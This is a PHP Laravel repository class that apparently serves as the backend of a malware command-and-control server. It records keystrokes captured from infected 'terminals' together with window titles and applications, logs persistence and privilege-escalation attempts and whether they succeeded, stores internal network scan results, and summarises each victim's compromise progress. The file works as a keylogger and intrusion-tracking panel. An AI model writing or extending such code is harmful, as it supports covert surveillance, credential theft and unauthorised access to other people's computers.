<?php

namespace App\Repositories;

use App\Models\Terminal;
use App\Models\TelemetryLog;
use App\Models\Keylog;
use App\Models\PersistenceAttempt;
use App\Models\PrivilegeEscalationAttempt;
use App\Models\NetworkScan;
use Illuminate\Support\Facades\DB;

class TelemetryRepository
{
    /**
     * Process a batch of telemetry reports from a terminal
     */
    public function processBatch(string $terminalId, array $reports): int
    {
        $processed = 0;
        
        DB::beginTransaction();
        try {
            // Ensure terminal exists
            $this->ensureTerminalExists($terminalId);
            
            foreach ($reports as $report) {
                $reportType = $report['report_type'] ?? 'unknown';
                
                switch ($reportType) {
                    case 'keylog':
                        $this->processKeylog($terminalId, $report);
                        break;
                    case 'persistence_attempt':
                        $this->processPersistenceAttempt($terminalId, $report);
                        break;
                    case 'privilege_escalation_attempt':
                        $this->processPrivilegeEscalationAttempt($terminalId, $report);
                        break;
                    case 'network_scan':
                        $this->processNetworkScan($terminalId, $report);
                        break;
                    default:
                        // Store as generic telemetry log
                        $this->processGenericLog($terminalId, $report);
                        break;
                }
                
                $processed++;
            }
            
            DB::commit();
        } catch (\Exception $e) {
            DB::rollBack();
            throw $e;
        }
        
        return $processed;
    }
    
    /**
     * Ensure terminal exists in database
     */
    private function ensureTerminalExists(string $terminalId): Terminal
    {
        return Terminal::firstOrCreate(
            ['id' => $terminalId],
            [
                'ip' => request()->ip(),
                'first_seen_at' => now(),
                'last_seen_at' => now(),
            ]
        );
    }
    
    /**
     * Process keylog report
     */
    private function processKeylog(string $terminalId, array $data): void
    {
        Keylog::create([
            'terminal_id' => $terminalId,
            'content' => $data['content'] ?? '',
            'window_title' => $data['window_title'] ?? null,
            'application' => $data['application'] ?? null,
            'captured_at' => $this->parseTimestamp($data['captured_at'] ?? null),
        ]);
    }
    
    /**
     * Process persistence attempt report
     */
    private function processPersistenceAttempt(string $terminalId, array $data): void
    {
        PersistenceAttempt::create([
            'terminal_id' => $terminalId,
            'method' => $data['method'] ?? 'unknown',
            'target' => $data['target'] ?? null,
            'success' => $data['success'] ?? false,
            'error_message' => $data['error_message'] ?? null,
            'error_code' => $data['error_code'] ?? null,
            'attempted_at' => $this->parseTimestamp($data['attempted_at'] ?? null),
        ]);
    }
    
    /**
     * Process privilege escalation attempt report
     */
    private function processPrivilegeEscalationAttempt(string $terminalId, array $data): void
    {
        PrivilegeEscalationAttempt::create([
            'terminal_id' => $terminalId,
            'technique' => $data['technique'] ?? 'unknown',
            'initial_level' => $data['initial_level'] ?? 'User',
            'target_level' => $data['target_level'] ?? null,
            'achieved_level' => $data['achieved_level'] ?? null,
            'success' => $data['success'] ?? false,
            'error_message' => $data['error_message'] ?? null,
            'details' => $data['details'] ?? null,
            'attempted_at' => $this->parseTimestamp($data['attempted_at'] ?? null),
        ]);
    }
    
    /**
     * Process network scan report
     */
    private function processNetworkScan(string $terminalId, array $data): void
    {
        NetworkScan::create([
            'terminal_id' => $terminalId,
            'scan_type' => $data['scan_type'] ?? 'unknown',
            'target_range' => $data['target_range'] ?? null,
            'discovered_hosts' => $data['discovered_hosts'] ?? [],
            'open_ports' => $data['open_ports'] ?? [],
            'hosts_found' => $data['hosts_found'] ?? 0,
            'duration_ms' => $data['duration_ms'] ?? null,
            'started_at' => $this->parseTimestamp($data['started_at'] ?? null),
            'completed_at' => $this->parseTimestamp($data['completed_at'] ?? null),
        ]);
    }
    
    /**
     * Process generic log entry
     */
    private function processGenericLog(string $terminalId, array $data): void
    {
        TelemetryLog::create([
            'terminal_id' => $terminalId,
            'level' => $data['level'] ?? 'Info',
            'module' => $data['module'] ?? $data['report_type'] ?? 'unknown',
            'message' => $data['message'] ?? json_encode($data),
            'exception_type' => $data['exception_type'] ?? null,
            'stack_trace' => $data['stack_trace'] ?? null,
            'context' => $data['context'] ?? $data,
            'logged_at' => $this->parseTimestamp($data['timestamp'] ?? $data['logged_at'] ?? null),
        ]);
    }
    
    /**
     * Parse timestamp from various formats
     */
    private function parseTimestamp(?string $timestamp): \DateTime
    {
        if (empty($timestamp)) {
            return now();
        }
        
        try {
            return new \DateTime($timestamp);
        } catch (\Exception $e) {
            return now();
        }
    }
    
    /**
     * Get terminal telemetry stats
     */
    public function getTerminalStats(string $terminalId): array
    {
        return [
            'keylogs_count' => Keylog::where('terminal_id', $terminalId)->count(),
            'persistence_attempts' => PersistenceAttempt::where('terminal_id', $terminalId)->count(),
            'persistence_success' => PersistenceAttempt::where('terminal_id', $terminalId)->where('success', true)->count(),
            'escalation_attempts' => PrivilegeEscalationAttempt::where('terminal_id', $terminalId)->count(),
            'escalation_success' => PrivilegeEscalationAttempt::where('terminal_id', $terminalId)->where('success', true)->count(),
            'network_scans' => NetworkScan::where('terminal_id', $terminalId)->count(),
            'hosts_discovered' => NetworkScan::where('terminal_id', $terminalId)->sum('hosts_found'),
            'telemetry_logs' => TelemetryLog::where('terminal_id', $terminalId)->count(),
            'error_logs' => TelemetryLog::where('terminal_id', $terminalId)->whereIn('level', ['Error', 'Critical'])->count(),
        ];
    }
}
